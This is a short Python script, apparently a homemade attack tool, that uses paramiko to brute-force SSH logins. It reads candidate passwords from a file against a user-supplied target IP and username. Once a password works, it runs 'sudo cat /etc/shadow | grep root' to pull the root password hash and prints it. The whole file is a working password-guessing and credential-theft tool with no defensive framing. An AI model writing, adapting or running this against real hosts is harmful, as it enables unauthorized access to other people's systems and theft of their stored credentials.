import paramiko
from termcolor import colored

def connect(host, username, p):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(host, username=username, password=p)
    stdin, stdout, stderr  = ssh.exec_command('sudo cat /etc/shadow | grep root')
    stdin.write(p)
    stdin.flush()
    print('output', stdout.read())


def main():
    host = input('Target IP: ')
    username = input('Target Username: ')
    passwd = open('passwords.txt')
    for p in passwd.readlines():
        p = p.rstrip()
        try:
            connect(host, username, p)
            print(colored(f'[+] {username} and {p} are a match! ', 'blue'))
            break
        except:
            print(colored(f'[-] {username}: {p} does not match.', 'red'))
    else:
        return



if __name__=='__main__':
    main()
